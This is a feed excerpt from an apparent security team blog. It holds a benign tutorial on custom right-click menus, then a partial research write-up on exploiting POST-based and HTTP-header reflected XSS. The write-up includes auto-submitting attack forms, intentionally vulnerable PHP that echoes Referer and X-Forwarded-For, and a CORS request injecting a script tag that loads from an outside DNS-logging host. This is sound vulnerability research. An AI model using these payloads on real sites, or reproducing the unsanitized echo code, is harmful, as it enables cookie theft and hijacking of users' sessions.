    <content type="html"><![CDATA[<h3 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h3><p>   Q：为什么要自定义右键菜单？</p>
<p>   A：为了更友好的交互（呵呵）</p>
<a id="more"></a>
<h3 id="【一般思路】"><a href="#【一般思路】" class="headerlink" title="【一般思路】"></a>【一般思路】</h3><p>  严格来讲，右键菜单应该叫上下文菜单，在html5中也新定义了这个contextmenu全局属性。<br>它的语法是这样的：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">contextmenu</span>=<span class="value">"supermenu"</span>&gt;</span>这个段落附加了一个名为 "supermenu" 的上下文菜单。<span class="tag">&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">menu</span> <span class="attribute">id</span>=<span class="value">"supermenu"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">command</span> <span class="attribute">label</span>=<span class="value">"Step 1: Write Tutorial"</span> <span class="attribute">onclick</span>=<span class="value">"doSomething()"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">command</span> <span class="attribute">label</span>=<span class="value">"Step 2: Edit Tutorial"</span> <span class="attribute">onclick</span>=<span class="value">"doSomethingElse()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">menu</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><code>contextmenu</code> 属性规定元素的上下文菜单。当用户右键点击元素时，会出现上下文菜单。<br><code>contextmenu</code> 属性的值是要打开的<code>&lt;menu&gt;</code>元素的 id。<br>在这里，我注意到浏览器支持问题：<br><img src="http://dassec.b0.upaiyun.com/simin/pic1.png" alt="image"><br>!!!但是!<br><img src="http://dassec.b0.upaiyun.com/simin/pic2.png" alt="image"><br>在Firefox中并没有出现预想中的结果！<br>然后我发现下面这样可以实现：<br><img src="http://dassec.b0.upaiyun.com/simin/pic4.png" alt="image"></p>
<p>所以这里要注意一下，</p>
<blockquote>
<p>①w3cschool上<code>&lt;menu&gt;</code>的子标签用的是<code>&lt;command&gt;</code>，是有问题的；菜鸟教程上用的是<code>&lt;menuitem&gt;</code>,亲测可行。</p>
<p>②w3cschool上没有给<code>&lt;menu&gt;</code>加一个type属性,必须要加上type=”context”才能成功实现。</p>
</blockquote>
<p><img src="http://dassec.b0.upaiyun.com/simin/pic5.png" alt="image"></p>
<p>更细致的关于menu和menuitem实现上下文菜单可以参考博文<a href="https://segmentfault.com/a/1190000002449360" target="_blank" rel="external">《利用HTML 5中的Menu和Menuitem元素快速创建菜单》</a></p>
<p>可能大家也发现了，这个contextmenu属性只能在原有的上下文菜单上添加，而不能对原有的上下文菜单项进行删除等操作，这样是它的局限性。这时，就需要我们自己通过js来模拟右键点击出现上下文菜单。</p>
<p>写过一段时间JS的都知道，我们实现这个上下文菜单大概这个思路：<br>写个ul列表(隐藏掉) -&gt; 监听鼠标右键事件 -&gt; 将ul列表显示出来</p>
<p>但是，实现的时候，还需要注意几个细节，于是我将这个粗糙的思路细化了一下：</p>
<p>(文中js代码都是基于jQuery的)</p>
<h4 id="阻止浏览器默认右键菜单（上下文菜单）"><a href="#阻止浏览器默认右键菜单（上下文菜单）" class="headerlink" title="阻止浏览器默认右键菜单（上下文菜单）"></a>阻止浏览器默认右键菜单（上下文菜单）</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).bind(<span class="string">"contextmenu"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;);</span><br></pre></td></tr></table></figure>
<h4 id="定义一个ul列表"><a href="#定义一个ul列表" class="headerlink" title="定义一个ul列表"></a>定义一个ul列表</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">div</span> <span class="attribute">style</span>=<span class="value">"display:none"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="title">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">li</span>&gt;</span>menuitem1<span class="tag">&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">li</span>&gt;</span>menuitem2<span class="tag">&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">li</span>&gt;</span>menuitem3<span class="tag">&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里要注意列表的放置位置，跟上下文菜单作用的区域相关。</p>
<h4 id="监听鼠标右键点击事件"><a href="#监听鼠标右键点击事件" class="headerlink" title="监听鼠标右键点击事件"></a>监听鼠标右键点击事件</h4><p>这里是根据事件对象的button值来判断的，比如mousedown的事件对象：<br><img src="http://dassec.b0.upaiyun.com/simin/pic6.png" alt="image"><br>由于click事件和mousedown事件很像，在这里将两者做一下比较：</p>
<table>
<thead>
<tr>
<th>鼠标事件</th>
<th>button值</th>
<th>事件描述</th>
</tr>
</thead>
<tbody>
<tr>
<td> click</td>
<td>0</td>
<td>单击鼠标左键    </td>
</tr>
<tr>
<td> click</td>
<td>1</td>
<td>单击鼠标中键    </td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td> mousedown</td>
<td>0</td>
<td>鼠标左键被按下  </td>
</tr>
<tr>
<td> mousedown</td>
<td>1</td>
<td>鼠标中键被按下  </td>
</tr>
<tr>
<td> mousedown</td>
<td>2</td>
<td>鼠标右键被按下  </td>
</tr>
</tbody>
</table>
<blockquote>
<p>click事件只会在单击鼠标左键和中键时触发，单击右键时不会触发</p>
</blockquote>
<h4 id="给ul列表定位及显示"><a href="#给ul列表定位及显示" class="headerlink" title="给ul列表定位及显示"></a>给ul列表定位及显示</h4><p>之前我们提到列表的放置位置，就是为了更准确的给它定位。一般上下文菜单是显示在鼠标稍微右下角的地方，所有首先要定位当前鼠标的坐标。</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
<th>兼容性</th>
</tr>
</thead>
<tbody>
<tr>
<td>  clientX、clientY</td>
<td>触发点相对<strong>浏览器可视区域</strong>左上角距离，不随页面滚动而改变</td>
<td>所有浏览器均支持</td>
</tr>
<tr>
<td>pageX、pageY</td>
<td>触发点相对<strong>文档区域</strong>左上角距离，会随着页面滚动而改变</td>
<td>IE6/7/8不支持</td>
</tr>
<tr>
<td>offsetX、offsetY</td>
<td>触发点相对被<strong>触发dom</strong>的左上角距离，不过左上角基准点在不同浏览器中有区别，其中在IE中以内容区左上角为基准点不包括边框，如果触发点在边框上会返回负值，而chrome中以边框左上角为基准点。</td>
<td>IE所有版本，chrome，Safari均完美支持，Firefox不支持</td>
</tr>
<tr>
<td>layerX、layerY</td>
<td>触发点相对被<strong>触发dom</strong>左上角的距离，数值与offsetX/Y相同，这个变量就是<strong>firefox</strong>用来替代offsetX/Y的，基准点为边框左上角，但是有个条件就是，被触发的dom需要设置为position:relative或者position:absolute，否则会返回相对html文档区域左上角的距离</td>
<td>IE6/7/8不支持，opera不支持，IE9/10和Chrome、Safari均支持</td>
</tr>
<tr>
<td>screenX、screenY</td>
<td>触发点相对<strong>显示器屏幕</strong>左上角的距离，不随页面滚动而改变</td>
<td>所有浏览器均支持</td>
</tr>
</tbody>
</table>
<p><img src="http://dassec.b0.upaiyun.com/simin/pic7.png" alt="image"><br>选择给鼠标定位的参数，那么就选择相应的方式给ul列表定位。</p>
<p>个人推荐使用pageX和pageY，因为我们最后给ul列表定位时，会用到<code>position:absolute</code>。绝对定位是相对于 static定位以外的第一个父元素进行定位。如果两者都是body定位的话，不容易出现定位失误。然后再<code>display：block</code>。</p>
<blockquote>
<p>多定义一个事件：鼠标左键点击页面，ul列表<code>display：none</code></p>
</blockquote>
<h3 id="【简单实现】"><a href="#【简单实现】" class="headerlink" title="【简单实现】"></a>【简单实现】</h3><p>代码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">div</span> <span class="attribute">class</span>=<span class="value">"container"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="title">div</span> <span class="attribute">class</span>=<span class="value">"header"</span>&gt;</span>自定义右键菜单-example1<span class="tag">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="title">h1</span>&gt;</span>自定义右键菜单<span class="tag">&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">div</span> <span class="attribute">class</span>=<span class="value">"btns"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">button</span>&gt;</span>example-1<span class="tag">&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">button</span>&gt;</span>example-2<span class="tag">&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">button</span>&gt;</span>example-3<span class="tag">&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="title">button</span>&gt;</span>example-4<span class="tag">&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">div</span> <span class="attribute">id</span>=<span class="value">"contextMenu"</span> <span class="attribute">style</span>=<span class="value">"display:none"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="title">ul</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="title">li</span>&gt;</span><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"#"</span>&gt;</span>菜单一<span class="tag">&lt;/<span class="title">a</span>&gt;</span><span class="tag">&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="title">li</span>&gt;</span><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"#"</span>&gt;</span>菜单二<span class="tag">&lt;/<span class="title">a</span>&gt;</span><span class="tag">&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="title">li</span>&gt;</span><span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">"#"</span>&gt;</span>菜单三<span class="tag">&lt;/<span class="title">a</span>&gt;</span><span class="tag">&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="title">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">"http://ajax.aspnetcdn.com/ajax/jQuery/jquery-1.8.0.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="javascript"></span><br><span class="line">    $(<span class="string">".btns button"</span>).mousedown(<span class="function"><span class="keyword">function</span>(<span class="params">params</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(params.button == <span class="number">2</span>)&#123;</span><br><span class="line">            $(<span class="built_in">document</span>).bind(<span class="string">'contextmenu'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="literal">false</span>;&#125;);</span><br><span class="line">            $(<span class="string">"#contextMenu"</span>).css(&#123;<span class="string">'top'</span>:params.pageY+<span class="string">'px'</span>,<span class="string">'left'</span>:params.pageX+<span class="string">'px'</span>&#125;);</span><br><span class="line">            $(<span class="string">"#contextMenu"</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;);</span><br><span class="line">    $(<span class="string">"body"</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $(<span class="string">"#contextMenu"</span>).hide();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>效果：<br><img src="http://dassec.b0.upaiyun.com/simin/pic8.png" alt="image"></p>
<h3 id="【插件】"><a href="#【插件】" class="headerlink" title="【插件】"></a>【插件】</h3><p>事实上，大神早已为我们打造好了“神器”，请戳张鑫旭的<br><a href="http://www.zhangxinxu.com/wordpress/2011/05/jquery-smartmenu%E5%8F%B3%E9%94%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E4%B8%8A%E4%B8%8B%E6%96%87%E8%8F%9C%E5%8D%95%E6%8F%92%E4%BB%B6/" target="_blank" rel="external">《jQuery smartMenu右键自定义上下文菜单插件》</a></p>
<p>本文完</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;【前言】&quot;&gt;&lt;a href=&quot;#【前言】&quot; class=&quot;headerlink&quot; title=&quot;【前言】&quot;&gt;&lt;/a&gt;【前言】&lt;/h3&gt;&lt;p&gt;   Q：为什么要自定义右键菜单？&lt;/p&gt;
&lt;p&gt;   A：为了更友好的交互（呵呵）&lt;/p&gt;
    
    </summary>
    
      <category term="开发笔记" scheme="http://das.scusec.org/categories/%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="contextmenu" scheme="http://das.scusec.org/tags/contextmenu/"/>
    
      <category term="simin" scheme="http://das.scusec.org/tags/simin/"/>
    
      <category term="上下文菜单" scheme="http://das.scusec.org/tags/%E4%B8%8A%E4%B8%8B%E6%96%87%E8%8F%9C%E5%8D%95/"/>
    
      <category term="右键菜单" scheme="http://das.scusec.org/tags/%E5%8F%B3%E9%94%AE%E8%8F%9C%E5%8D%95/"/>
    
  </entry>
  
  <entry>
    <title>不常见的xss利用探索</title>
    <link href="http://das.scusec.org/2016/06/27/unusual-xss-exploit/"/>
    <id>http://das.scusec.org/2016/06/27/unusual-xss-exploit/</id>
    <published>2016-06-26T16:00:00.000Z</published>
    <updated>2016-07-28T07:10:28.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>反射型xss，相对于持久型xss来说比较鸡肋；需要欺骗用户点击构造好的链接，达到窃取cookie，或是进一步CSRF劫持用户操作的目的。若是get型的xss，javascript代码直接在url中，虽然有些怪异，也好歹能用，愿者上钩。<a id="more"></a>但是若js代码是在post数据包，或者是在header里，那就更显得鸡肋了，甚至无法利用。我查阅了大量的资料，有了下面的尝试。</p>
<h3 id="0x02-POST型反射xss"><a href="#0x02-POST型反射xss" class="headerlink" title="0x02 POST型反射xss"></a>0x02 POST型反射xss</h3><p>对于post反射型xss，其实已经有比较成熟的利用方法：构造post表单，利用js直接提交。表单构造如下：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">form</span>  <span class="attribute">name</span>=<span class="value">"form"</span> <span class="attribute">id</span>=<span class="value">"form1"</span> <span class="attribute">method</span>=<span class="value">"post"</span> <span class="attribute">action</span>=<span class="value">"http://target.com/test.php"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">name</span>=<span class="value">"searchKey"</span> <span class="attribute">hidden</span>=<span class="value">"true"</span> <span class="attribute">value</span>=<span class="value">'test"&gt;&lt;img src=1 onerror=alert(document.domain)&gt;'</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'form1'</span>).submit();</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>将html保存后，诱导被攻击者访问这个html文件，触发如下：<br><img src="https://img.alicdn.com/imgextra/i1/792076116/TB2e_kZrVXXXXabXpXXXXXXXXXX_!!792076116.png" alt="post"></p>
<h3 id="0x03-http头部反射xss"><a href="#0x03-http头部反射xss" class="headerlink" title="0x03 http头部反射xss"></a>0x03 http头部反射xss</h3><p>如果xss代码的输入点是在http头部的话，那么利用表单提交的方法就不行。利用ajax异步跨域请求的方法等会再谈，先说说一个比较特殊的头信息<code>referer</code>。</p>
<h4 id="referer头信息xss"><a href="#referer头信息xss" class="headerlink" title="referer头信息xss"></a>referer头信息xss</h4><p>当浏览器进行跳转时，一般会将前一个页面的url带入referer头部中，如果我们控制了跳转前的url，并使之跳转到target页面，那么referer头的xss漏洞便可以利用。当然，chrome和firefox会对跳转前url里的”&lt;&gt;”等进行urlencode，但是IE却不会，所以这种方法在IE下适用。漏洞页面如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>简单的将referer信息输出，那么构造一个跳转：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span><br><span class="line"><span class="built_in">window</span>.location.href=<span class="string">"http://target.com/xss_test/referer.php"</span>;</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>访问:<code>http://localhost:8088/test/header/referer_location.html?&lt;script&gt;alert(document.domain) &lt;/script&gt;</code>。在<code>IE11</code>上测试成功</p>
<p><img src="https://img.alicdn.com/imgextra/i3/792076116/TB2QcVdsXXXXXcuXXXXXXXXXXXX_!!792076116.png" alt="xss"></p>
<p>除了window.location跳转外，还可以利用iframe、表单提交等方式。利用<code>iframe</code>标签:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">iframe</span> <span class="attribute">src</span>=<span class="value">"http://target.com/xss_test/referer.php"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>利用<code>表单提交</code>的方式:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">form</span>   <span class="attribute">id</span>=<span class="value">"xss"</span></span><br><span class="line">          <span class="attribute">name</span>=<span class="value">"xss"</span></span><br><span class="line">          <span class="attribute">method</span>=<span class="value">"GET"</span></span><br><span class="line">          <span class="attribute">action</span>=<span class="value">"http://target.com/xss_test/referer.php"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">"xss"</span>).submit();</span><br><span class="line">  </span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<h4 id="对其他header的xss尝试"><a href="#对其他header的xss尝试" class="headerlink" title="对其他header的xss尝试"></a>对其他header的xss尝试</h4><p>如何让受害者点击某个链接后，访问漏洞页面并带上特定的header信息，ajax可以办到这点。由于需要跨域请求，这里参考了CORS(Cross Origin Resourse-Sharing)的模型。CORS模型实现跨域资源共享需要服务器端设置一定的返回头部，所以这里攻击场景就比较狭隘，仅做学术的研究。服务器端可设置的http头如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: &#20801;&#35768;&#36328;&#22495;&#35775;&#38382;&#30340;&#22495;&#65292;&#21487;&#20197;&#26159;&#19968;&#20010;&#22495;&#30340;&#21015;&#34920;&#65292;&#20063;&#21487;&#20197;&#26159;&#36890;&#37197;&#31526;&#34;*&#34;&#12290;&#36825;&#37324;&#35201;&#27880;&#24847;Origin&#35268;&#21017;&#21482;&#23545;&#22495;&#21517;&#26377;&#25928;&#65292;&#24182;&#19981;&#20250;&#23545;&#23376;&#30446;&#24405;&#26377;&#25928;&#12290;&#21363;http://foo.example/subdir/&#26159;&#26080;&#25928;&#30340;&#12290;&#20294;&#26159;&#19981;&#21516;&#23376;&#22495;&#21517;&#38656;&#35201;&#20998;&#24320;&#35774;&#32622;&#65292;&#36825;&#37324;&#30340;&#35268;&#21017;&#21487;&#20197;&#21442;&#29031;&#37027;&#31687;&#21516;&#28304;&#31574;&#30053;&#10;Access-Control-Allow-Credentials: &#26159;&#21542;&#20801;&#35768;&#35831;&#27714;&#24102;&#26377;&#39564;&#35777;&#20449;&#24687;&#65292;&#36825;&#37096;&#20998;&#23558;&#20250;&#22312;&#19979;&#38754;&#35814;&#32454;&#35299;&#37322;&#10;Access-Control-Expose-Headers: &#20801;&#35768;&#33050;&#26412;&#35775;&#38382;&#30340;&#36820;&#22238;&#22836;&#65292;&#35831;&#27714;&#25104;&#21151;&#21518;&#65292;&#33050;&#26412;&#21487;&#20197;&#22312;XMLHttpRequest&#20013;&#35775;&#38382;&#36825;&#20123;&#22836;&#30340;&#20449;&#24687;(&#35980;&#20284;webkit&#27809;&#26377;&#23454;&#29616;&#36825;&#20010;)&#10;Access-Control-Max-Age: &#32531;&#23384;&#27492;&#27425;&#35831;&#27714;&#30340;&#31186;&#25968;&#12290;&#22312;&#36825;&#20010;&#26102;&#38388;&#33539;&#22260;&#20869;&#65292;&#25152;&#26377;&#21516;&#31867;&#22411;&#30340;&#35831;&#27714;&#37117;&#23558;&#19981;&#20877;&#21457;&#36865;&#39044;&#26816;&#35831;&#27714;&#32780;&#26159;&#30452;&#25509;&#20351;&#29992;&#27492;&#27425;&#36820;&#22238;&#30340;&#22836;&#20316;&#20026;&#21028;&#26029;&#20381;&#25454;&#65292;&#38750;&#24120;&#26377;&#29992;&#65292;&#22823;&#24133;&#20248;&#21270;&#35831;&#27714;&#27425;&#25968;&#10;Access-Control-Allow-Methods: &#20801;&#35768;&#20351;&#29992;&#30340;&#35831;&#27714;&#26041;&#27861;&#65292;&#20197;&#36887;&#21495;&#38548;&#24320;&#10;Access-Control-Allow-Headers: &#20801;&#35768;&#33258;&#23450;&#20041;&#30340;&#22836;&#37096;&#65292;&#20197;&#36887;&#21495;&#38548;&#24320;&#65292;&#22823;&#23567;&#20889;&#19981;&#25935;&#24863;</span><br></pre></td></tr></table></figure></p>
<p>基于CORS模型，浏览器发起的ajax请求分为简单跨域请求和非简单跨域请求。简单跨域请求不需要服务器允许便可发起，但浏览器会阻止响应。服务器端的漏洞页面代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line">header(<span class="string">"Access-Control-Allow-Origin: *"</span>);</span><br><span class="line">header(<span class="string">"Access-Control-Allow-Headers: X-Forwarded-For, referer, Content-Type"</span>);</span><br><span class="line"><span class="keyword">echo</span> urldecode(<span class="variable">$_SERVER</span>[<span class="string">'X-Forwarded-For'</span>]);</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>本地测试html代码如下，X-Forwarded-For设置为<code>&lt;html&gt;&lt;script src=http://x_for.xxxx.ceye.io&gt;&lt;/script&gt;&lt;/html&gt;</code>，通过查看cloudeye上是否有dns请求记录验证标签是否被渲染。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="javascript"></span><br><span class="line"><span class="keyword">var</span> xmlhttp;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.XMLHttpRequest)</span><br><span class="line">  &#123;<span class="comment">// code for IE7+, Firefox, Chrome, Opera, Safari</span></span><br><span class="line">  xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;<span class="comment">// code for IE6, IE5</span></span><br><span class="line">  xmlhttp=<span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">xmlhttp.open(<span class="string">"POST"</span>,<span class="string">"http://taget.com/xss_test/cors.php"</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">xmlhttp.setRequestHeader(<span class="string">"X-Forwarded-For"</span>,<span class="string">"%3Chtml%3E%3Cscript%20src%3Dhttp%3A%2f%2fx_for.xxxx.ceye.io%3E%3C%2fscript%3E%3C%2fhtml%3E"</span>); <span class="comment">//若不加为简单跨域请求，无OPTIONS方法的预检请求</span></span><br><span class="line">xmlhttp.send(<span class="string">'data=123'</span>);</span><br><span class="line"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>利用chrome打开测试页面，可以看到ajax请求发送成功，并且打开该ajax请求的Preview，可以看到似乎response的html代码被解析了。</p>
<p><img src="https://img.alicdn.com/imgextra/i4/792076116/TB2VI8usXXXXXXgXpXXXXXXXXXX_!!792076116.png" alt="ajax"></p>
<p>script标签里的源是我的cloudeye地址，那么看看cloudeye里面是否有DNS记录，</p>
<p><img src="https://img.alicdn.com/imgextra/i3/792076116/TB2XvxKsXXXXXaYXXXXXXXXXXXX_!!792076116.png" alt="cloudeye"></p>
<p>DNS请求记录存在，说明html代码被浏览器解析了，到这里，似乎可以跨域触发基于header的xss了。但是经过进一步的验证过后，发现只是html代码被渲染，javascript代码却不能执行！！！</p>
